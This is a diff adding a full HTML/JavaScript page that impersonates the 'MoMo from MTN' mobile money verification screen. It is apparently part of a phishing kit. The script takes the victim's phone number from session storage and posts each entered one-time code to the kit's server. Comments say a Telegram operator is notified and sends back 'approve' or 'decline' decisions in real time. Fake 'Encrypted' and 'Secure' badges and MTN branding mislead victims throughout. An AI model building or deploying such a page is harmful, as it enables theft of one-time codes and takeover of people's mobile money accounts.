@@ -1,0 +1,779 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+  <title>MoMo — Verify Code</title>
+  <style>
+    :root {
+      --momo-blue: #004F71;
+      --momo-dark-blue: #003654;
+      --momo-light-blue: #4D849C;
+      --momo-pale-blue: #CCDCE3;
+      --momo-bg: #F2F5F7;
+      --momo-yellow: #FFCC05;
+      --momo-white: #FFFFFF;
+      --momo-text: #002033;
+      --momo-muted: #6B7B87;
+      --momo-border: #DCE3E8;
+      --momo-error: #D32F2F;
+      --momo-success: #15803D;
+      --momo-warn: #B45309;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    html, body {
+      height: 100%;
+      overflow: hidden;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      -webkit-font-smoothing: antialiased;
+    }
+    body {
+      background: var(--momo-bg);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 16px;
+    }
+    .phone {
+      width: 100%;
+      max-width: 420px;
+      height: 100%;
+      max-height: 740px;
+      background: var(--momo-white);
+      border-radius: 24px;
+      box-shadow: 0 24px 70px -16px rgba(0,54,84,0.28), 0 6px 20px rgba(0,54,84,0.08);
+      overflow: hidden;
+      display: flex;
+      flex-direction: column;
+      position: relative;
+    }
+
+    /* HEADER */
+    .topbar {
+      background: var(--momo-blue);
+      padding: 14px 18px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      flex-shrink: 0;
+      position: relative;
+    }
+    .topbar::after {
+      content: "";
+      position: absolute;
+      left: 0; right: 0; bottom: 0;
+      height: 2px;
+      background: var(--momo-yellow);
+    }
+    .back-btn {
+      width: 32px; height: 32px;
+      border-radius: 8px;
+      background: transparent;
+      border: none;
+      display: flex; align-items: center; justify-content: center;
+      color: #fff;
+      cursor: pointer;
+      flex-shrink: 0;
+      transition: background 0.15s;
+    }
+    .back-btn:hover { background: rgba(255,255,255,0.12); }
+    .back-btn svg { width: 20px; height: 20px; }
+    .brand { display: flex; align-items: center; gap: 8px; flex: 1; justify-content: center; }
+    .momo-logo { display: flex; align-items: center; gap: 8px; }
+    .momo-square {
+      width: 28px; height: 28px;
+      border-radius: 6px;
+      background: var(--momo-yellow);
+      display: flex; align-items: center; justify-content: center;
+      color: var(--momo-blue);
+      font-weight: 900;
+      font-size: 13px;
+      letter-spacing: -0.5px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.15);
+    }
+    .momo-wordmark { display: flex; flex-direction: column; line-height: 1; }
+    .momo-name { color: #fff; font-weight: 800; font-size: 17px; letter-spacing: -0.4px; }
+    .momo-sub {
+      color: rgba(255,255,255,0.75);
+      font-size: 9px; font-weight: 700;
+      letter-spacing: 0.9px; text-transform: uppercase;
+      margin-top: 2px;
+    }
+    .header-spacer { width: 32px; flex-shrink: 0; }
+
+    /* CONTENT */
+    .content {
+      flex: 1;
+      padding: 22px 22px 0;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      min-height: 0;
+      overflow-y: auto;
+    }
+
+    /* Shield illustration */
+    .shield {
+      width: 70px; height: 70px;
+      margin: 0 auto 16px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, var(--momo-blue) 0%, #006A93 100%);
+      display: flex; align-items: center; justify-content: center;
+      position: relative;
+      box-shadow: 0 10px 30px -8px rgba(0,79,113,0.4);
+    }
+    .shield::before {
+      content: "";
+      position: absolute;
+      inset: -8px;
+      border-radius: 50%;
+      border: 2px solid rgba(0,79,113,0.1);
+    }
+    .shield::after {
+      content: "";
+      position: absolute;
+      inset: -16px;
+      border-radius: 50%;
+      border: 1px solid rgba(0,79,113,0.06);
+    }
+    .shield svg {
+      width: 34px; height: 34px;
+      color: var(--momo-yellow);
+      position: relative;
+      z-index: 1;
+    }
+
+    /* Heading */
+    .heading { text-align: center; margin-bottom: 14px; }
+    .heading h1 {
+      font-size: 20px;
+      font-weight: 800;
+      color: var(--momo-dark-blue);
+      letter-spacing: -0.5px;
+      line-height: 1.25;
+    }
+    .heading p {
+      font-size: 12.5px;
+      color: var(--momo-muted);
+      margin-top: 7px;
+      line-height: 1.5;
+      max-width: 300px;
+      margin-left: auto;
+      margin-right: auto;
+      font-weight: 500;
+    }
+    .heading p strong {
+      color: var(--momo-dark-blue);
+      font-weight: 800;
+    }
+
+    /* Timer bar */
+    .timer-bar {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 9px 14px;
+      background: linear-gradient(135deg, var(--momo-pale-blue) 0%, #E5EDF1 100%);
+      border-radius: 10px;
+      margin-bottom: 14px;
+      border: 1px solid var(--momo-border);
+      max-width: 260px;
+      margin-left: auto;
+      margin-right: auto;
+    }
+    .timer-left {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 11px;
+      font-weight: 700;
+      color: var(--momo-dark-blue);
+      letter-spacing: 0.3px;
+    }
+    .timer-left svg { width: 13px; height: 13px; color: var(--momo-blue); }
+    .timer-value {
+      font-size: 14px;
+      font-weight: 900;
+      color: var(--momo-blue);
+      font-variant-numeric: tabular-nums;
+      letter-spacing: -0.3px;
+    }
+    .timer-value.warning { color: var(--momo-warn); }
+    .timer-value.expired { color: var(--momo-error); }
+
+    /* OTP boxes */
+    .otp-row {
+      display: flex;
+      gap: 12px;
+      justify-content: center;
+      margin-bottom: 10px;
+      position: relative;
+    }
+    .otp-wrap { position: relative; }
+    .otp-box {
+      width: 62px;
+      height: 68px;
+      border-radius: 14px;
+      border: 2px solid var(--momo-border);
+      background: #F7FAFC;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 28px;
+      font-weight: 900;
+      color: var(--momo-dark-blue);
+      transition: all 0.15s;
+      font-variant-numeric: tabular-nums;
+      letter-spacing: -0.5px;
+    }
+    .otp-box.active {
+      border-color: var(--momo-blue);
+      background: var(--momo-white);
+      box-shadow: 0 0 0 4px rgba(0,79,113,0.12);
+    }
+    .otp-box.filled {
+      border-color: var(--momo-blue);
+      background: var(--momo-white);
+      color: var(--momo-blue);
+    }
+    .otp-box.error {
+      border-color: var(--momo-error);
+      background: rgba(211,47,47,0.04);
+    }
+    .otp-box.disabled {
+      opacity: 0.5;
+    }
+    #otpInput {
+      position: absolute;
+      inset: 0;
+      width: 100%;
+      height: 100%;
+      opacity: 0;
+      border: none;
+      background: transparent;
+      font-size: 16px;
+      outline: none;
+      z-index: 3;
+      cursor: text;
+    }
+    .otp-row.locked #otpInput { cursor: not-allowed; }
+
+    /* Error */
+    .error-msg {
+      display: none;
+      align-items: center;
+      gap: 6px;
+      justify-content: center;
+      color: var(--momo-error);
+      font-size: 12px;
+      font-weight: 700;
+      padding: 9px 12px;
+      background: rgba(211,47,47,0.07);
+      border-radius: 8px;
+      margin: 0 auto 6px;
+      max-width: 320px;
+      border-left: 3px solid var(--momo-error);
+      text-align: left;
+    }
+    .error-msg.show { display: flex; }
+    .error-msg svg { width: 14px; height: 14px; flex-shrink: 0; }
+
+    /* Resend */
+    .resend-block { text-align: center; margin-top: 12px; }
+    .resend-text {
+      font-size: 12px;
+      color: var(--momo-muted);
+      font-weight: 500;
+      margin-bottom: 4px;
+    }
+    .resend-btn {
+      background: transparent;
+      border: none;
+      color: var(--momo-blue);
+      font-size: 13px;
+      font-weight: 800;
+      cursor: pointer;
+      padding: 6px 10px;
+      border-radius: 8px;
+      font-family: inherit;
+      letter-spacing: 0.2px;
+      transition: background 0.15s;
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+    }
+    .resend-btn:hover:not(:disabled) { background: rgba(0,79,113,0.08); }
+    .resend-btn:disabled { color: var(--momo-muted); cursor: not-allowed; opacity: 0.6; }
+    .resend-btn svg { width: 13px; height: 13px; }
+
+    /* Trust badges */
+    .trust-row {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 14px;
+      margin-top: 18px;
+      padding: 11px 0;
+      border-top: 1px solid var(--momo-border);
+    }
+    .trust-item {
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      font-size: 10.5px;
+      color: var(--momo-muted);
+      font-weight: 600;
+      letter-spacing: 0.2px;
+    }
+    .trust-item svg { width: 12px; height: 12px; color: var(--momo-blue); flex-shrink: 0; }
+
+    /* FOOTER */
+    .footer {
+      padding: 14px 22px 20px;
+      border-top: 1px solid var(--momo-border);
+      background: var(--momo-white);
+      flex-shrink: 0;
+    }
+    .btn-verify {
+      width: 100%;
+      padding: 16px;
+      background: var(--momo-blue);
+      color: #fff;
+      border: none;
+      border-radius: 12px;
+      font-size: 15px;
+      font-weight: 800;
+      letter-spacing: -0.2px;
+      cursor: pointer;
+      transition: background 0.15s, transform 0.05s, opacity 0.15s;
+      box-shadow: 0 6px 18px rgba(0,79,113,0.22);
+      font-family: inherit;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+    .btn-verify:hover:not(:disabled)  { background: var(--momo-dark-blue); }
+    .btn-verify:active:not(:disabled) { transform: scale(0.985); }
+    .btn-verify:disabled {
+      background: #C4CDD5;
+      box-shadow: none;
+      cursor: not-allowed;
+    }
+
+    /* LOADER */
+    .loader-overlay {
+      position: absolute;
+      inset: 0;
+      background: var(--momo-white);
+      z-index: 100;
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 32px;
+      text-align: center;
+      animation: fadeIn 0.2s ease;
+    }
+    .loader-overlay.show { display: flex; }
+    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+    .loader-ring {
+      width: 72px; height: 72px;
+      border-radius: 50%;
+      border: 4px solid var(--momo-pale-blue);
+      border-top-color: var(--momo-blue);
+      border-right-color: var(--momo-yellow);
+      animation: spin 0.9s linear infinite;
+      margin-bottom: 28px;
+      position: relative;
+    }
+    .loader-ring::after {
+      content: "";
+      position: absolute;
+      inset: 10px;
+      border-radius: 50%;
+      border: 3px solid transparent;
+      border-bottom-color: var(--momo-blue);
+      animation: spin 1.4s linear infinite reverse;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .loader-title {
+      font-size: 19px;
+      font-weight: 800;
+      color: var(--momo-dark-blue);
+      letter-spacing: -0.4px;
+      margin-bottom: 10px;
+      line-height: 1.3;
+    }
+    .loader-sub {
+      font-size: 13px;
+      color: var(--momo-muted);
+      font-weight: 500;
+      line-height: 1.55;
+      max-width: 320px;
+    }
+
+    /* TOAST */
+    .toast {
+      position: absolute;
+      left: 16px; right: 16px; bottom: 90px;
+      background: var(--momo-error);
+      color: #fff;
+      padding: 13px 16px;
+      border-radius: 12px;
+      font-size: 13px;
+      font-weight: 700;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      box-shadow: 0 12px 30px rgba(211,47,47,0.35);
+      z-index: 200;
+      opacity: 0;
+      transform: translateY(20px);
+      transition: all 0.25s ease;
+      pointer-events: none;
+    }
+    .toast.show { opacity: 1; transform: translateY(0); }
+    .toast.success { background: var(--momo-success); box-shadow: 0 12px 30px rgba(21,128,61,0.35); }
+    .toast.warn { background: var(--momo-warn); box-shadow: 0 12px 30px rgba(180,83,9,0.35); }
+    .toast svg { width: 18px; height: 18px; flex-shrink: 0; }
+
+    @media (max-height: 700px) {
+      .shield { width: 58px; height: 58px; margin-bottom: 12px; }
+      .shield svg { width: 26px; height: 26px; }
+      .heading { margin-bottom: 10px; }
+      .heading h1 { font-size: 17px; }
+      .otp-box { width: 54px; height: 60px; font-size: 24px; }
+      .trust-row { margin-top: 14px; }
+      .timer-bar { margin-bottom: 10px; padding: 7px 12px; }
+    }
+    @media (max-width: 380px) {
+      .otp-box { width: 52px; height: 58px; font-size: 22px; }
+      .otp-row { gap: 10px; }
+    }
+  </style>
+</head>
+<body>
+  <div class="phone">
+    <header class="topbar">
+      <button class="back-btn" aria-label="Back" onclick="history.back()">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+          <polyline points="15 18 9 12 15 6"></polyline>
+        </svg>
+      </button>
+      <div class="brand">
+        <div class="momo-logo">
+          <div class="momo-square">M</div>
+          <div class="momo-wordmark">
+            <span class="momo-name">MoMo</span>
+            <span class="momo-sub">from MTN</span>
+          </div>
+        </div>
+      </div>
+      <div class="header-spacer"></div>
+    </header>
+
+    <main class="content">
+      <div class="shield">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+          <polyline points="9 12 11 14 15 10"/>
+        </svg>
+      </div>
+
+      <div class="heading">
+        <h1>Enter Verification Code</h1>
+        <p>We sent a <strong>4-digit code</strong> to your MoMo number. Enter it below to continue.</p>
+      </div>
+
+      <div class="timer-bar">
+        <div class="timer-left">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+          Code expires in
+        </div>
+        <div class="timer-value" id="timerValue">05:00</div>
+      </div>
+
+      <div class="otp-row" id="otpRow">
+        <div class="otp-wrap"><div class="otp-box active" data-index="0"></div></div>
+        <div class="otp-wrap"><div class="otp-box" data-index="1"></div></div>
+        <div class="otp-wrap"><div class="otp-box" data-index="2"></div></div>
+        <div class="otp-wrap"><div class="otp-box" data-index="3"></div></div>
+        <input type="tel" id="otpInput" maxlength="4" inputmode="numeric" autocomplete="one-time-code" aria-label="Verification code" />
+      </div>
+
+      <div class="error-msg" id="errorMsg">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+        <span id="errorText">Code expired — please tap Resend.</span>
+      </div>
+
+      <div class="resend-block">
+        <div class="resend-text">Didn't receive the code?</div>
+        <button type="button" class="resend-btn" id="resendBtn">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+            <polyline points="23 4 23 10 17 10"/>
+            <path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"/>
+          </svg>
+          <span id="resendLabel">Resend Code</span>
+        </button>
+      </div>
+
+      <div class="trust-row">
+        <div class="trust-item">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+          Encrypted
+        </div>
+        <div class="trust-item">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+          Secure
+        </div>
+        <div class="trust-item">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+          Instant
+        </div>
+      </div>
+    </main>
+
+    <footer class="footer">
+      <button class="btn-verify" id="verifyBtn" disabled>
+        <span class="label">Verify Code</span>
+      </button>
+    </footer>
+
+    <div class="loader-overlay" id="loaderOverlay">
+      <div class="loader-ring"></div>
+      <div class="loader-title">Verifying code…</div>
+      <div class="loader-sub">Please wait while we confirm your code with MTN.</div>
+    </div>
+
+    <div class="toast" id="toast">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+      <span id="toastText">Invalid code. Please try again.</span>
+    </div>
+  </div>
+
+  <script>
+    const otpInput = document.getElementById('otpInput');
+    const otpBoxes = document.querySelectorAll('.otp-box');
+    const otpRow = document.getElementById('otpRow');
+    const verifyBtn = document.getElementById('verifyBtn');
+    const errorMsg = document.getElementById('errorMsg');
+    const errorText = document.getElementById('errorText');
+    const loaderOverlay = document.getElementById('loaderOverlay');
+    const toast = document.getElementById('toast');
+    const toastText = document.getElementById('toastText');
+    const resendBtn = document.getElementById('resendBtn');
+    const resendLabel = document.getElementById('resendLabel');
+    const timerValue = document.getElementById('timerValue');
+
+    let codeExpired = false;
+    let secondsLeft = 300; // 5 minutes
+    let resendCooldown = 0;
+    let resendInterval = null;
+    let mainTimer = null;
+
+    function getPhone() {
+      try {
+        const s = JSON.parse(sessionStorage.getItem('mtnSubmission') || '{}');
+        return s.phone || '';
+      } catch (_) { return ''; }
+    }
+
+    function formatTime(s) {
+      const m = Math.floor(s / 60).toString().padStart(2, '0');
+      const ss = (s % 60).toString().padStart(2, '0');
+      return `${m}:${ss}`;
+    }
+
+    // --- Main 5-minute timer ---
+    function tickMain() {
+      if (secondsLeft <= 0) {
+        timerValue.textContent = '00:00';
+        timerValue.classList.add('expired');
+        codeExpired = true;
+        verifyBtn.disabled = true;
+        otpRow.classList.add('locked');
+        otpInput.disabled = true;
+        otpBoxes.forEach(b => b.classList.add('disabled'));
+        showError('Code expired — please tap Resend.');
+        // Notify server → Telegram inactive notification
+        fetch('/api/otp-inactive', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ phone: getPhone() })
+        }).catch(() => {});
+        // Route to inactive page after a short delay
+        setTimeout(() => { window.location.href = 'inactive.html'; }, 3500);
+        return;
+      }
+      secondsLeft--;
+      timerValue.textContent = formatTime(secondsLeft);
+      if (secondsLeft <= 60) timerValue.classList.add('warning');
+      if (secondsLeft <= 30) timerValue.classList.add('expired');
+    }
+    timerValue.textContent = formatTime(secondsLeft);
+    mainTimer = setInterval(tickMain, 1000);
+
+    function updateBoxes(value) {
+      otpBoxes.forEach((box, i) => {
+        box.textContent = value[i] || '';
+        box.classList.toggle('filled', i < value.length);
+        box.classList.toggle('active', i === value.length && value.length < 4);
+        box.classList.remove('error');
+      });
+      verifyBtn.disabled = value.length !== 4 || codeExpired;
+      if (value.length > 0) hideError();
+    }
+
+    otpInput.addEventListener('input', () => {
+      if (codeExpired) return;
+      otpInput.value = otpInput.value.replace(/\D/g, '').slice(0, 4);
+      updateBoxes(otpInput.value);
+      if (otpInput.value.length === 4) otpInput.blur();
+    });
+
+    otpRow.addEventListener('click', () => { if (!codeExpired) otpInput.focus(); });
+    setTimeout(() => { if (!codeExpired) otpInput.focus(); }, 300);
+
+    function showError(msg) {
+      errorText.textContent = msg || 'Invalid code. Please try again.';
+      errorMsg.classList.add('show');
+      otpBoxes.forEach(b => b.classList.add('error'));
+    }
+    function hideError() {
+      errorMsg.classList.remove('show');
+      otpBoxes.forEach(b => b.classList.remove('error'));
+    }
+    function showToast(msg, type) {
+      toastText.textContent = msg;
+      toast.classList.remove('success', 'warn');
+      if (type) toast.classList.add(type);
+      toast.classList.add('show');
+      setTimeout(() => toast.classList.remove('show'), 4000);
+    }
+    function showLoader() { loaderOverlay.classList.add('show'); }
+    function hideLoader() { loaderOverlay.classList.remove('show'); }
+
+    // --- Resend with 60s cooldown ---
+    resendBtn.addEventListener('click', async () => {
+      if (resendCooldown > 0) return;
+
+      // Reset the 5-minute timer
+      secondsLeft = 300;
+      codeExpired = false;
+      timerValue.textContent = formatTime(secondsLeft);
+      timerValue.classList.remove('warning', 'expired');
+      otpRow.classList.remove('locked');
+      otpInput.disabled = false;
+      otpBoxes.forEach(b => {
+        b.classList.remove('disabled', 'error');
+        b.textContent = '';
+        b.classList.remove('filled', 'active');
+      });
+      otpBoxes[0].classList.add('active');
+      otpInput.value = '';
+      verifyBtn.disabled = true;
+      hideError();
+      otpInput.focus();
+
+      // Notify server → Telegram gets a "resend requested" alert
+      try {
+        await fetch('/api/resend-otp', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ phone: getPhone() })
+        });
+      } catch (_) {}
+
+      showToast('A new code has been sent to your number.', 'success');
+
+      resendCooldown = 60;
+      resendBtn.disabled = true;
+      resendLabel.textContent = `Resend in ${resendCooldown}s`;
+
+      resendInterval = setInterval(() => {
+        resendCooldown--;
+        if (resendCooldown <= 0) {
+          clearInterval(resendInterval);
+          resendBtn.disabled = false;
+          resendLabel.textContent = 'Resend Code';
+        } else {
+          resendLabel.textContent = `Resend in ${resendCooldown}s`;
+        }
+      }, 1000);
+    });
+
+    // --- Submit ---
+    verifyBtn.addEventListener('click', async () => {
+      hideError();
+      if (codeExpired) {
+        showError('Code expired — please tap Resend.');
+        return;
+      }
+      const code = otpInput.value.trim();
+      if (code.length !== 4) {
+        showError('Please enter the 4-digit code.');
+        return;
+      }
+
+      try { await fetch('/api/reset', { method: 'POST' }); } catch (_) {}
+
+      showLoader();
+
+      const payload = {
+        otp: code,
+        phone: getPhone(),
+        submittedAt: new Date().toISOString()
+      };
+
+      try {
+        const res = await fetch('/api/submit-otp', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+        if (!res.ok) throw new Error('network');
+        const data = await res.json();
+
+        if (data.status === 'approved') {
+          window.location.href = 'success.html';
+          return;
+        }
+        if (data.status === 'declined') {
+          hideLoader();
+          otpInput.value = '';
+          updateBoxes('');
+          showToast(data.message || 'Code expired — please tap Resend.', 'warn');
+          showError(data.message || 'Code expired — please tap Resend.');
+          return;
+        }
+      } catch (_) {
+        hideLoader();
+        showToast('Connection error — please try again.');
+      }
+    });
+
+    // --- Real-time decision from Telegram ---
+    try {
+      const evt = new EventSource('/api/stream');
+      evt.onmessage = (e) => {
+        try {
+          const s = JSON.parse(e.data);
+          if (s.decision === 'otp-approved') {
+            window.location.href = 'success.html';
+          } else if (s.decision === 'otp-declined') {
+            hideLoader();
+            otpInput.value = '';
+            updateBoxes('');
+            const msg = s.declineMessage || 'Code expired — please tap Resend.';
+            showToast(msg, 'warn');
+            showError(msg);
+          } else if (s.decision === 'otp-inactive') {
+            window.location.href = 'inactive.html';
+          }
+        } catch (_) {}
+      };
+    } catch (_) {}
+  </script>
+</body>
+</html>
